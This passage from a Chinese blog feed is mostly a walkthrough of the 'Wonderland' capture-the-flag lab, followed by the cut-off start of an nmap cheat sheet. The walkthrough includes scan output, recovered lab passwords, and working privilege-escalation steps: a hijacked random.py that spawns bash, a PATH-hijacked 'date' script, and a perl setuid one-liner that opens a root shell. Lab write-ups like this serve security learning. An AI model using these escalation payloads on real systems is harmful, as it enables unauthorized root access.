elapsed</span><br><span class="line">Initiating Ping Scan at 03:37</span><br><span class="line">Scanning 10.10.255.228 [4 ports]</span><br><span class="line">Completed Ping Scan at 03:37, 0.34s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 03:37</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 03:37, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 03:37</span><br><span class="line">Scanning 10.10.255.228 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.255.228</span><br><span class="line">Discovered open port 22/tcp on 10.10.255.228</span><br><span class="line">Completed SYN Stealth Scan at 03:37, 4.07s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 03:37</span><br><span class="line">Scanning 2 services on 10.10.255.228</span><br><span class="line">Completed Service scan at 03:37, 13.62s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 10.10.255.228.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 03:37</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:37 (0:00:00 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:38 (0:00:01 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:38 (0:00:01 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:39 (0:00:02 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:39 (0:00:02 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:40 (0:00:03 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:40 (0:00:03 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:41 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:41 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:42 (0:00:05 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:42 (0:00:05 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:43 (0:00:05 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:43 (0:00:06 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:44 (0:00:06 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:44 (0:00:07 remaining)</span><br><span class="line">NSE Timing: About 98.52% done; ETC: 03:45 (0:00:07 remaining)</span><br><span class="line">NSE Timing: About 98.89% done; ETC: 03:45 (0:00:06 remaining)</span><br><span class="line">NSE Timing: About 99.63% done; ETC: 03:46 (0:00:02 remaining)</span><br><span class="line">NSE Timing: About 99.63% done; ETC: 03:46 (0:00:02 remaining)</span><br><span class="line">NSE Timing: About 99.63% done; ETC: 03:47 (0:00:02 remaining)</span><br><span class="line">NSE Timing: About 99.63% done; ETC: 03:47 (0:00:02 remaining)</span><br><span class="line">NSE Timing: About 99.63% done; ETC: 03:48 (0:00:02 remaining)</span><br><span class="line">Completed NSE at 03:48, 661.47s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 03:48</span><br><span class="line">Completed NSE at 03:48, 1.21s elapsed</span><br><span class="line">Nmap scan report for 10.10.255.228</span><br><span class="line">Host is up, received reset ttl 60 (0.29s latency).</span><br><span class="line">Scanned at 2023-07-14 03:37:02 EDT for 680s</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:7.6p1: </span><br><span class="line">|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*</span><br><span class="line">|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*</span><br><span class="line">|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*</span><br><span class="line">|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*</span><br><span class="line">|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111</span><br><span class="line">|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*</span><br><span class="line">|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*</span><br><span class="line">|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*</span><br><span class="line">|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*</span><br><span class="line">|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*</span><br><span class="line">|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*</span><br><span class="line">|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*</span><br><span class="line">|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*</span><br><span class="line">|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919</span><br><span class="line">|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473</span><br><span class="line">|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*</span><br><span class="line">|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617</span><br><span class="line">|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145</span><br><span class="line">|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110</span><br><span class="line">|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109</span><br><span class="line">|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685</span><br><span class="line">|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*</span><br><span class="line">|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*</span><br><span class="line">|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*</span><br><span class="line">80/tcp open  http    syn-ack ttl 60 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span><br><span class="line">| http-enum: </span><br><span class="line">|   /r/: Potentially interesting folder</span><br><span class="line">|_  /img/: Potentially interesting folder</span><br><span class="line">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-jsonp-detection: Couldn&#x27;t find any JSONP endpoints.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable</span><br><span class="line">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#x27;t find wp-login.php</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 03:48</span><br><span class="line">Completed NSE at 03:48, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 03:48</span><br><span class="line">Completed NSE at 03:48, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 691.65 seconds</span><br><span class="line">           Raw packets sent: 1093 (48.068KB) | Rcvd: 1002 (40.088KB)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在22和80端口开发，并且并没有发现可以利用的漏洞，于是继续扫描80端口的web服务</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714160136386.png" alt="image-20230714160136386"></p><p>发现访问对应页面</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714160330484.png" alt="image-20230714160330484"></p><p>发现了<code>alice:HowDothTheLittleCrocodileImproveHisShiningTail</code> 推测是ssh登录用户名密码</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714160626485.png" alt="image-20230714160626485"></p><p>当前目录存在 root.txt和walus_and_the_carpenter.py</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714160756498.png" alt="image-20230714160756498"></p><p>然后直接用find命令查找user.txt,但是找不到，于是查看了hint，hint说</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714161029363.png" alt="image-20230714161029363"></p><p>意思是所有的东西颠倒了，alice的用户目录下有root.txt那么对应的root的目录下面应该会有user.txt</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714161147450.png" alt="image-20230714161147450"></p><p>事实上也是这样的。</p><p>然后是第二步骤，需要提权才能看到root.txt里面的内容。</p><p>用户目录下面的python文件内容如下，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">poem = <span class="string">&quot;&quot;&quot;The sun was shining on the sea,</span></span><br><span class="line"><span class="string">Shining with all his might:</span></span><br><span class="line"><span class="string">He did his very best to make</span></span><br><span class="line"><span class="string">The billows smooth and bright —</span></span><br><span class="line"><span class="string">And this was odd, because it was</span></span><br><span class="line"><span class="string">The middle of the night.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The moon was shining sulkily,</span></span><br><span class="line"><span class="string">Because she thought the sun</span></span><br><span class="line"><span class="string">Had got no business to be there</span></span><br><span class="line"><span class="string">After the day was done —</span></span><br><span class="line"><span class="string">&quot;It’s very rude of him,&quot; she said,</span></span><br><span class="line"><span class="string">&quot;To come and spoil the fun!&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The sea was wet as wet could be,</span></span><br><span class="line"><span class="string">The sands were dry as dry.</span></span><br><span class="line"><span class="string">You could not see a cloud, because</span></span><br><span class="line"><span class="string">No cloud was in the sky:</span></span><br><span class="line"><span class="string">No birds were flying over head —</span></span><br><span class="line"><span class="string">There were no birds to fly.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The Walrus and the Carpenter</span></span><br><span class="line"><span class="string">Were walking close at hand;</span></span><br><span class="line"><span class="string">They wept like anything to see</span></span><br><span class="line"><span class="string">Such quantities of sand:</span></span><br><span class="line"><span class="string">&quot;If this were only cleared away,&quot;</span></span><br><span class="line"><span class="string">They said, &quot;it would be grand!&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;If seven maids with seven mops</span></span><br><span class="line"><span class="string">Swept it for half a year,</span></span><br><span class="line"><span class="string">Do you suppose,&quot; the Walrus said,</span></span><br><span class="line"><span class="string">&quot;That they could get it clear?&quot;</span></span><br><span class="line"><span class="string">&quot;I doubt it,&quot; said the Carpenter,</span></span><br><span class="line"><span class="string">And shed a bitter tear.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;O Oysters, come and walk with us!&quot;</span></span><br><span class="line"><span class="string">The Walrus did beseech.</span></span><br><span class="line"><span class="string">&quot;A pleasant walk, a pleasant talk,</span></span><br><span class="line"><span class="string">Along the briny beach:</span></span><br><span class="line"><span class="string">We cannot do with more than four,</span></span><br><span class="line"><span class="string">To give a hand to each.&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The eldest Oyster looked at him.</span></span><br><span class="line"><span class="string">But never a word he said:</span></span><br><span class="line"><span class="string">The eldest Oyster winked his eye,</span></span><br><span class="line"><span class="string">And shook his heavy head —</span></span><br><span class="line"><span class="string">Meaning to say he did not choose</span></span><br><span class="line"><span class="string">To leave the oyster-bed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">But four young oysters hurried up,</span></span><br><span class="line"><span class="string">All eager for the treat:</span></span><br><span class="line"><span class="string">Their coats were brushed, their faces washed,</span></span><br><span class="line"><span class="string">Their shoes were clean and neat —</span></span><br><span class="line"><span class="string">And this was odd, because, you know,</span></span><br><span class="line"><span class="string">They hadn’t any feet.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Four other Oysters followed them,</span></span><br><span class="line"><span class="string">And yet another four;</span></span><br><span class="line"><span class="string">And thick and fast they came at last,</span></span><br><span class="line"><span class="string">And more, and more, and more —</span></span><br><span class="line"><span class="string">All hopping through the frothy waves,</span></span><br><span class="line"><span class="string">And scrambling to the shore.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The Walrus and the Carpenter</span></span><br><span class="line"><span class="string">Walked on a mile or so,</span></span><br><span class="line"><span class="string">And then they rested on a rock</span></span><br><span class="line"><span class="string">Conveniently low:</span></span><br><span class="line"><span class="string">And all the little Oysters stood</span></span><br><span class="line"><span class="string">And waited in a row.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;The time has come,&quot; the Walrus said,</span></span><br><span class="line"><span class="string">&quot;To talk of many things:</span></span><br><span class="line"><span class="string">Of shoes — and ships — and sealing-wax —</span></span><br><span class="line"><span class="string">Of cabbages — and kings —</span></span><br><span class="line"><span class="string">And why the sea is boiling hot —</span></span><br><span class="line"><span class="string">And whether pigs have wings.&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;But wait a bit,&quot; the Oysters cried,</span></span><br><span class="line"><span class="string">&quot;Before we have our chat;</span></span><br><span class="line"><span class="string">For some of us are out of breath,</span></span><br><span class="line"><span class="string">And all of us are fat!&quot;</span></span><br><span class="line"><span class="string">&quot;No hurry!&quot; said the Carpenter.</span></span><br><span class="line"><span class="string">They thanked him much for that.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;A loaf of bread,&quot; the Walrus said,</span></span><br><span class="line"><span class="string">&quot;Is what we chiefly need:</span></span><br><span class="line"><span class="string">Pepper and vinegar besides</span></span><br><span class="line"><span class="string">Are very good indeed —</span></span><br><span class="line"><span class="string">Now if you’re ready Oysters dear,</span></span><br><span class="line"><span class="string">We can begin to feed.&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;But not on us!&quot; the Oysters cried,</span></span><br><span class="line"><span class="string">Turning a little blue,</span></span><br><span class="line"><span class="string">&quot;After such kindness, that would be</span></span><br><span class="line"><span class="string">A dismal thing to do!&quot;</span></span><br><span class="line"><span class="string">&quot;The night is fine,&quot; the Walrus said</span></span><br><span class="line"><span class="string">&quot;Do you admire the view?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;It was so kind of you to come!</span></span><br><span class="line"><span class="string">And you are very nice!&quot;</span></span><br><span class="line"><span class="string">The Carpenter said nothing but</span></span><br><span class="line"><span class="string">&quot;Cut us another slice:</span></span><br><span class="line"><span class="string">I wish you were not quite so deaf —</span></span><br><span class="line"><span class="string">I’ve had to ask you twice!&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;It seems a shame,&quot; the Walrus said,</span></span><br><span class="line"><span class="string">&quot;To play them such a trick,</span></span><br><span class="line"><span class="string">After we’ve brought them out so far,</span></span><br><span class="line"><span class="string">And made them trot so quick!&quot;</span></span><br><span class="line"><span class="string">The Carpenter said nothing but</span></span><br><span class="line"><span class="string">&quot;The butter’s spread too thick!&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;I weep for you,&quot; the Walrus said.</span></span><br><span class="line"><span class="string">&quot;I deeply sympathize.&quot;</span></span><br><span class="line"><span class="string">With sobs and tears he sorted out</span></span><br><span class="line"><span class="string">Those of the largest size.</span></span><br><span class="line"><span class="string">Holding his pocket handkerchief</span></span><br><span class="line"><span class="string">Before his streaming eyes.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;O Oysters,&quot; said the Carpenter.</span></span><br><span class="line"><span class="string">&quot;You’ve had a pleasant run!</span></span><br><span class="line"><span class="string">Shall we be trotting home again?&quot;</span></span><br><span class="line"><span class="string">But answer came there none —</span></span><br><span class="line"><span class="string">And that was scarcely odd, because</span></span><br><span class="line"><span class="string">They’d eaten every one.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    line = random.choice(poem.split(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The line was:\t&quot;</span>, line)</span><br></pre></td></tr></table></figure><p>看似并没有什么漏洞，但是可以利用import导入的random，如果在当前目录下面有random.py那么会优先导入当前目录下的random.py所以可以利用这点达到getshell。但是如果只是自己运行当然没有，所以尝试寻找是否存在suid权限或者sudo进行提权。</p><p>首先尝试suid进行提权，寻找具有suid权限的</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714161719245.png" alt="image-20230714161719245"></p><p>然后看看sudo -l</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714161850974.png" alt="image-20230714161850974"></p><p>发现存在python能够用sudo进行执行，所以利用这点写一个random.py即可提权到rabbit用户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714162156811.png" alt="image-20230714162156811"></p><p>执行以后成功获取了rabbit的shell</p><p>进入rabbit用户目录发现了</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714162232892.png" alt="image-20230714162232892"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714162314858.png" alt="image-20230714162314858"></p><p>发现存在suid权限，所以推测是否可以利用这个文件进行提权</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714162400769.png" alt="image-20230714162400769"></p><p>仔细分析当中的内容，发现了一个时间，并且每次执行都不一样，推测是否可能调用的是系统命令或者是，于是自己尝试使用date测试，发现跟内容一样，推测使用了date这个命令。</p><p>又因为<strong>suid执行的时候，权限虽然是提升后的权限，但是环境变量访问的却是当前用户的环境变量</strong>， 所以可以利用环境变量，达到自定义执行shell脚本达到提权目的。</p><p>操作如下：因为环境变量的执行是会从左往右依次去查找执行的，即例如/tmp:/usr/bin这样的PATH变量，如果<strong>tmp</strong>里面<strong>存在date</strong>而**/usr/bin<strong>里面也存在date但是会</strong>执行tmp**里面的。</p><p>所以只需要在/tmp里面写一个date的自定义shell脚本即可。</p><p>date内容如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714163446157.png" alt="image-20230714163446157"></p><p>然后发现提权成功了，到这一步我确实没想到怎么继续了。</p><p>suid也尝试过但是没有用。</p><p>这一步其实使用Capabilities提权</p><p><code>    getcap -r / 2&gt;/dev/null</code></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714163635207.png" alt="image-20230714163635207"></p><p>有一点要注意，我发现如果是通过其他用户提权到hatter这个用户的是没法用Capabilities位进行提权到，这个进程并没有继承到hatter这个用户的Capabilities位权限，只能用ssh或者其他手段进行，然后再hatter用户根目录找到了hatter用户的密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hatter@wonderland:/home/hatter$ cat /home/hatter/password.txt </span><br><span class="line">WhyIsARavenLikeAWritingDesk?</span><br></pre></td></tr></table></figure><p>所以直接用密码进行ssh然后再利用    <code>perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;</code>进行提权</p><p>然后就成功拿到了root的shell</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230714171051589.png" alt="image-20230714171051589"></p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透工具学习</title>
      <link href="/2023/07/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/07/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基本扫描</span></span><br><span class="line">nmap [IP] # 扫描一个主机</span><br><span class="line">nmap -Pn [IP] # 扫描一个主机如果无法ping通也继续扫描</span><br><span class="line">nmap [网络地址/子网前缀长度] # 扫描一个CIDR地址</span><br><span class="line">nmap [-iL] hosts.txt # 扫描文件内的所有主机</span><br><span class="line">nmap 192.168.1.1-10 # 扫描一个IP范围内的</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定端口</span></span><br><span class="line">nmap -p [端口号] [IP] # 扫描某个端口</span><br><span class="line">nmap -p [端口号-端口号] [IP] # 扫描某个区间端口</span><br><span class="line">nmap -p [端口号,..] [IP] # 扫描某个特定端口</span><br><span class="line">nmap -p- www.example.com # 扫描所有端口</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定扫描类型</span></span><br><span class="line">TCP SYN扫描（默认）：使用TCP SYN包探测主机上的开放端口。使用-sS选项指定。</span><br><span class="line">nmap -sS www.example.com</span><br><span class="line">TCP 连接扫描：使用TCP连接探测主机上的开放端口。使用-sT选项指定。</span><br><span class="line">nmap -sT www.example.com</span><br><span class="line">UDP 扫描：探测主机上的开放UDP端口。使用-sU选项指定。--top-ports &lt;number&gt; 最常用的UDP端口</span><br><span class="line">nmap -sU www.example.com </span><br><span class="line">nmap -sU --top-ports 20 &lt;target&gt; .将扫描前 20 个最常用的 UDP 端口，从而获得更可接受的扫描时间。</span><br><span class="line">操作系统检测：尝试识别主机的操作系统类型和版本。使用-O选项指定。</span><br><span class="line">nmap -O www.example.com</span><br><span class="line">版本检测：尝试识别主机上运行的服务及其版本。使用-sV选项指定。</span><br><span class="line">nmap -sV www.example.com</span><br><span class="line">全面扫描：结合TCP SYN扫描、TCP连接扫描、UDP扫描、操作系统检测和版本检测进行全面扫描。使用-sS -sT -sU -O -sV选项指定。</span><br><span class="line">nmap -sS -sT -sU -O -sV www.example.com</span><br><span class="line">TCP Null Scans TCP 空扫描 </span><br><span class="line">-sN</span><br><span class="line">TCP FIN Scans </span><br><span class="line">-sF</span><br><span class="line">TCP Xmas Scans </span><br><span class="line">-sX</span><br><span class="line">ping扫描</span><br><span class="line">-sn</span><br><span class="line">增加信息</span><br><span class="line">nmap -v www.example.com</span><br><span class="line">nmap -vv www.example.com # 二级</span><br><span class="line">aggressive 侵略模式</span><br><span class="line">nmap -A www.example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span 